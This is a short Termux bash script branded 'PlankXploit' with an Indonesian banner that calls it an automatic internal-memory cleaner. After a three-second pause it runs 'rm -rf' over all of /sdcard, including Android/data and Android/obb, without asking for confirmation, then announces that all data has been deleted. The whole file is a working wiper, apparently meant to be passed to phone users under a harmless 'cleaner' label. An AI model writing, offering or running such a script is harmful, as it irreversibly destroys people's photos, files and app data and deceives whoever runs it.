#!/data/data/com.termux/files/usr/bin/bash

# Banner
echo -e "\e[1;31m"
figlet -f slant "PlankXploit" | lolcat
echo -e "\e[1;31m[!] Auto Pembersih Memori Internal [!]\e[0m"
echo -e "\e[1;33m[*] Menjalankan penghapusan semua data di /sdcard...\e[0m"
sleep 3

# Folder umum yang akan dihapus
TARGETS=(
  "/sdcard/*"
  "/sdcard/Android/data/*"
  "/sdcard/Android/obb/*"
  "/sdcard/.Trash-*"
  "/sdcard/.nomedia"
)

# Proses penghapusan
for folder in "${TARGETS[@]}"; do
    rm -rf $folder
    echo -e "\e[1;32m[✓] Dihapus: $folder\e[0m"
done

echo -e "\n\e[1;36m[✓] Pembersihan selesai!\n[✓] Semua data telah dihapus dari memori internal.\e[0m"